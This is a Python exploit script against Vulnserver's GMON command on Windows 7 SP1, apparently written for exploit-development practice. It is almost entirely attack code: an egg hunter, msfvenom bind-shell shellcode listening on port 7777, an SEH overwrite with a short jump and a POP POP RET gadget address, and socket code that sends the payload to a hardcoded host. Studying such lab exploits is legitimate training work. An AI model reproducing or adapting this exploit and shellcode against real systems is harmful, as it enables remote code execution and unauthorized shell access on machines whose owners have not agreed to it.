#!/usr/bin/python 
# Vulnserver GMON exploit for Windows 7 SP1 
import socket
import sys 
import time

host = '192.168.1.123'
port = 9999

# Standard egg hunter tag = suls 
egghunter=(
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x73\x75\x6c\x73\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
) 

# msfvenom -p windows/shell_bind_tcp -b "\x00\xcc" -a x86 -f python LPORT=7777
buf =  ""
buf += "\xd9\xe5\xb8\xac\x15\xf1\xa4\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x53\x31\x43\x17\x83\xc3\x04\x03\xef\x06\x13"
buf += "\x51\x13\xc0\x51\x9a\xeb\x11\x36\x12\x0e\x20\x76\x40"
buf += "\x5b\x13\x46\x02\x09\x98\x2d\x46\xb9\x2b\x43\x4f\xce"
buf += "\x9c\xee\xa9\xe1\x1d\x42\x89\x60\x9e\x99\xde\x42\x9f"
buf += "\x51\x13\x83\xd8\x8c\xde\xd1\xb1\xdb\x4d\xc5\xb6\x96"
buf += "\x4d\x6e\x84\x37\xd6\x93\x5d\x39\xf7\x02\xd5\x60\xd7"
buf += "\xa5\x3a\x19\x5e\xbd\x5f\x24\x28\x36\xab\xd2\xab\x9e"
buf += "\xe5\x1b\x07\xdf\xc9\xe9\x59\x18\xed\x11\x2c\x50\x0d"
buf += "\xaf\x37\xa7\x6f\x6b\xbd\x33\xd7\xf8\x65\x9f\xe9\x2d"
buf += "\xf3\x54\xe5\x9a\x77\x32\xea\x1d\x5b\x49\x16\x95\x5a"
buf += "\x9d\x9e\xed\x78\x39\xfa\xb6\xe1\x18\xa6\x19\x1d\x7a"
buf += "\x09\xc5\xbb\xf1\xa4\x12\xb6\x58\xa1\xd7\xfb\x62\x31"
buf += "\x70\x8b\x11\x03\xdf\x27\xbd\x2f\xa8\xe1\x3a\x4f\x83"
buf += "\x56\xd4\xae\x2c\xa7\xfd\x74\x78\xf7\x95\x5d\x01\x9c"
buf += "\x65\x61\xd4\x09\x6d\xc4\x87\x2f\x90\xb6\x77\xf0\x3a"
buf += "\x5f\x92\xff\x65\x7f\x9d\xd5\x0e\xe8\x60\xd6\x2e\x88"
buf += "\xed\x30\x24\x5a\xb8\xeb\xd0\x98\x9f\x23\x47\xe2\xf5"
buf += "\x1b\xef\xab\x1f\x9b\x10\x2c\x0a\x8b\x86\xa7\x59\x0f"
buf += "\xb7\xb7\x77\x27\xa0\x20\x0d\xa6\x83\xd1\x12\xe3\x73"
buf += "\x71\x80\x68\x83\xfc\xb9\x26\xd4\xa9\x0c\x3f\xb0\x47"
buf += "\x36\xe9\xa6\x95\xae\xd2\x62\x42\x13\xdc\x6b\x07\x2f"
buf += "\xfa\x7b\xd1\xb0\x46\x2f\x8d\xe6\x10\x99\x6b\x51\xd3"
buf += "\x73\x22\x0e\xbd\x13\xb3\x7c\x7e\x65\xbc\xa8\x08\x89"
buf += "\x0d\x05\x4d\xb6\xa2\xc1\x59\xcf\xde\x71\xa5\x1a\x5b"
buf += "\x81\xec\x06\xca\x0a\xa9\xd3\x4e\x57\x4a\x0e\x8c\x6e"
buf += "\xc9\xba\x6d\x95\xd1\xcf\x68\xd1\x55\x3c\x01\x4a\x30"
buf += "\x42\xb6\x6b\x11"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
time.sleep(0.2) 
payload = "GMON /.:/"
payload += "\x90" * 15
payload += "sulssuls" 
payload += buf
payload += "A" * (3500 - 8 - len(buf) ) 
payload += "\xeb\x09\x90\x90" # Short Jmp  
payload += "\xB4\x10\x50\x62" # POP POP RET in essfunc.dll 0x625010b4
payload += "\x90" * 10
payload += egghunter    
payload += "D" * (5000-3515-4-4-10- len(egghunter))
print(payload)
print("Sending Ev1l payload.....") 
s.send(payload)
s.close() 
 